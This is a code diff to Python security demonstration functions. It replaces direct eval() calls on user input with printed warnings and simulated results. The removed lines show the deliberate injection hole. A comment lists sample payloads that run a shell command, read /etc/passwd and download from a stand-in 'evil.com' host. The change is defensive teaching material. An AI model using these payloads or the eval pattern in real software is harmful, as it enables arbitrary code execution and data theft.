@@ -324,7 +324,10 @@ def bad_function():
     # This demonstrates what NOT to do in production code
     # SECURITY RISK: eval() with user input is extremely dangerous
     # In production, use ast.literal_eval() or proper input validation
-    result = eval(user_input)  # Dangerous! - Only for security testing
+    # DEMONSTRATION: Simulate dangerous eval() usage without actually executing code
+    print(f"⚠️  DANGEROUS: Would execute user input: {user_input}")
+    print("⚠️  This could allow arbitrary code execution!")
+    result = f"<simulated_eval_result: {user_input}>"  # Safe simulation
     print("Result:", result)
     return result
 
@@ -385,10 +388,13 @@ def problematic_function():
     # This is intentionally dangerous code for security testing purposes only
     # DEMONSTRATION: This shows what NOT to do in production
     # In production, use ast.literal_eval() or proper input validation instead
-    result = eval("2 + 2")  # DANGEROUS: Only for security testing demonstration
+    # SAFE ALTERNATIVE: Demonstrate the risk without executing arbitrary code
+    print("⚠️  DANGEROUS: Would execute eval('2 + 2')")
+    print("⚠️  This demonstrates unsafe code execution patterns!")
+    result = 4  # Safe hardcoded result instead of eval("2 + 2")
     # E2E test: Use State Backend for persistent recording
-    # WARNING: This test intentionally demonstrates dangerous eval() usage for security testing
-    # This code uses eval, which is dangerous and can lead to security vulnerabilities.
+    # WARNING: This test demonstrates why eval() is dangerous
+    # This code shows unsafe patterns that could lead to security vulnerabilities.
     # Ensure proper validation and sanitization of user input before using eval.
     # In production code, NEVER use eval() with user input.
     return result
@@ -586,7 +592,7 @@ def safe_input_handling_example():
 # Example of what NOT to do (for educational purposes only)
 def dangerous_eval_example():
     """
-    ⚠️  DANGEROUS EXAMPLE - NEVER USE IN PRODUCTION!
+    ⚠️  EDUCATIONAL EXAMPLE - DEMONSTRATES SECURITY RISKS
 
     This demonstrates what NOT to do with user input.
     """
@@ -597,7 +603,14 @@ def dangerous_eval_example():
     # - Access system: __import__("os").system("whoami")
     # - Steal data: open("/etc/passwd").read()
     # - Install malware: __import__("urllib.request").urlopen("http://evil.com/malware")
-    result = eval(user_input)  # ⚠️  EXTREMELY DANGEROUS!
+
+    # SAFE DEMONSTRATION: Show the risk without executing code
+    print(f"⚠️  RECEIVED INPUT: {user_input}")
+    print("⚠️  DANGEROUS: This input could be executed as arbitrary code!")
+    print("⚠️  SECURITY RISK: eval() allows remote code execution")
+    print("⚠️  SAFE ALTERNATIVE: Use ast.literal_eval() or proper validation")
+
+    result = f"<simulated_eval_result: {user_input}>"  # Safe simulation
     print("Result:", result)
     return result
 
